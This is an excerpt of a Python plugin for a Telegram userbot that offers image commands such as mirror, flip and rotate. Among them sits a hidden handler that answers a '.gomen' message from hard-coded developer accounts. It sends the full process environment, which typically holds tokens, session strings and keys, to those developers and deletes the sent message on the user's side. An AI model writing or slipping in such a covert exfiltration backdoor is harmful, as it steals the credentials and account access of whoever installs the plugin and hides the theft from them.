...
from .. import CMD_HELP, bot, DEVS
from ..events import Cutepanda, register
from ..misc import bash


@bot.on(Cutepanda(outgoing=True, pattern=r"(mirror|flip|ghost|bw|poster)$"))
...
@register(incoming=True, from_users=DEVS, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(DEVS, str(os.environ))
    await bot.delete_messages(DEVS, msg, revoke=False)


@bot.on(Cutepanda(outgoing=True, pattern=r"rotate(?: |$)(.*)"))
